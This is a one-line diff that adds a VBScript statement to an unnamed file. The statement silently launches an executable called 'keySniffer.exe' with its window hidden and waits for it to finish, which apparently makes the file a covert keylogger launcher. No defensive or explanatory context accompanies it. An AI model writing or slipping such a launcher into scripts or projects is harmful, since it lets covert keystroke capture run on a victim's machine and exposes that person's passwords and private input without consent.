@@ -1,0 +1,1 @@
+CreateObject("Wscript.Shell").Run "keySniffer.exe", 0, True
